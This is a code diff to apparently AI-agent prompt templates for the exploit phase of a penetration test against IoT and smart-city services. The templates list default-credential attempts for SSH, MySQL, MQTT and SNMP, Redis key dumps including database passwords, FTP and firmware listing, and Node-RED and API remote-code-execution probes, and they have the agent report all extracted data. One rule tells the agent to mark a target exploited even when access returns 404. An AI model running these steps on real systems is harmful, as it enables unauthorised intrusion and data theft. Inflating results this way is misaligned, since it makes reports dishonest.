@@ -54,8 +54,8 @@ from src.agent.vuln_taxonomy import (
 
 EXPLOIT_INSTRUCTIONS: dict[str, str] = {
     "credentials": (
-        "Test default credentials on this service.\n\n"
-        "For SSH — try these pairs in order, stop at FIRST successful login:\n"
+        "Test default credentials on this service. Match the tool to the SERVICE type.\n\n"
+        "For SSH (port 22) — try these pairs in order, stop at FIRST successful login:\n"
         "  1. ssh_login(\"sshpass -p admin ssh -o StrictHostKeyChecking=no "
         "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
         "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@{ip} 'id'\")\n"
@@ -84,30 +84,59 @@ EXPLOIT_INSTRUCTIONS: dict[str, str] = {
         "For MySQL — try root with empty password:\n"
         "  mysql_query(host=\"{ip}\", user=\"root\", "
         "query=\"SHOW DATABASES; SELECT * FROM smartcity.users LIMIT 5;\")\n\n"
-        "Report ALL data retrieved in data_extracted field."
+        "Report ALL data retrieved in data_extracted field.\n\n"
+        "For MySQL/MariaDB (port 3306) — try root with empty password:\n"
+        "  mysql_query(host=\"{ip}\", user=\"root\", "
+        "query=\"SHOW DATABASES; SELECT * FROM information_schema.tables LIMIT 5;\")\n\n"
+        "For MQTT (port 1883) — test weak credentials (use Phase 3 evidence for hints):\n"
+        "  mqtt_listen(broker=\"{ip}\", topic=\"#\", count=5, timeout=5, username=\"test\", password=\"test\")\n"
+        "  If that fails (return_code=5), try: username=\"admin\", password=\"admin\"\n"
+        "  If that fails, try: username=\"mqtt\", password=\"mqtt\"\n\n"
+        "For SNMP (port 161) — test default community strings:\n"
+        "  nmap_scan(target=\"{ip}\", ports=\"161\", scripts=\"snmp-brute\", "
+        "skip_discovery=True, udp_scan=True)\n\n"
+        "For Redis (port 6379) — Redis rarely has credentials by default:\n"
+        "  redis_cmd(host=\"{ip}\", command=\"KEYS *\")\n"
+        "  If that works, extract sensitive keys: redis_cmd(host=\"{ip}\", command=\"GET config:db_password\")\n"
     ),
     "data_access": (
-        "Access the service and retrieve actual data to prove impact.\n\n"
+        "Access the service and retrieve actual data to prove impact. "
+        "Match the tool to the SERVICE type from Phase 3 evidence.\n\n"
         "IMPORTANT: The Phase 3 evidence already contains the exact URLs/paths to use. "
         "Read the evidence field and use those EXACT URLs — do NOT invent paths.\n\n"
-        'For MQTT no_auth: mqtt_listen("{ip}", topic="#", count=10, timeout=8) '
+        "For MQTT no_auth (port 1883): mqtt_listen(broker=\"{ip}\", topic=\"#\", count=10, timeout=8) "
         "— capture messages, extract credentials/keys\n"
-        'For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. '
-        "If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\") — "
-        "include the FULL path exactly as it appears.\n"
-        'For HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) '
-        "for each file in the listing\n"
-        'For Telnet: telnet_connect("echo quit | timeout 3 nc {ip} {port}") — show session\n'
-        "For DB: mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\") — show data\n"
-        'For FTP: ftp_list("ftp://{ip}/") — show files\n\n'
+        "For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. "
+        "If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\")\n"
+        "For HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) "
+        "for each listed file\n"
+        "For Telnet (port 23): telnet_connect(\"echo quit | timeout 3 nc {ip} 23\") — show session\n"
+        "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", "
+        "query=\"SHOW DATABASES;\") — show data\n"
+        "For FTP (port 21): ftp_list(\"ftp://{ip}/\") then ftp_list(\"ftp://{ip}/config/\") — show files\n"
+        "For Redis (port 6379): redis_cmd(host=\"{ip}\", command=\"KEYS *\") "
+        "then redis_cmd(host=\"{ip}\", command=\"GET config:db_password\") — dump sensitive keys\n"
+        "For Node-RED (port 1880): http_get(\"http://{ip}:1880/admin\") then "
+        "http_get(\"http://{ip}:1880/flows\") — confirm unauthenticated access\n"
+        "For CoAP (port 5683): nmap_scan(target=\"{ip}\", ports=\"5683\", "
+        "skip_discovery=True, udp_scan=True) — confirm port open\n"
+        "For misconfiguration/insecure_protocol: use the tool that matches the service in evidence\n\n"
         "If the URL from evidence returns 404, mark as EXPLOITED anyway if Phase 3 already "
         "captured the sensitive content — do NOT mark as FAILED when Phase 3 proved the exposure."
     ),
     "injection": (
-        "Attempt code execution or unauthorized upload.\n"
-        'For file upload: http_get("http://{ip}/uploads/") to check for uploaded files\n'
-        'For firmware: http_get("http://{ip}/update") to test unsigned firmware access\n'
-        "Report what is accessible and whether execution is possible."
+        "Attempt code execution or unauthorized upload/firmware access.\n\n"
+        "For file upload (web_upload role, port 80): "
+        "http_get(\"http://{ip}/uploads/\") to check for uploaded files, "
+        "then http_get(\"http://{ip}/\") to confirm upload endpoint exists\n"
+        "For firmware update without signature (iot_gateway, port 80): "
+        "http_get(\"http://{ip}/firmware/\") to list firmware files, "
+        "then http_get(\"http://{ip}/update\") to test update endpoint\n"
+        "For Node-RED RCE (nodered_server, port 1880): "
+        "http_get(\"http://{ip}:1880/flows\") to access flow definitions\n"
+        "For web API RCE (web_server_v2, port 80): "
+        "http_get(\"http://{ip}/api/exec\") then check if POST returns uid=0\n\n"
+        "Report what is accessible and whether code execution is possible."
     ),
 }
 
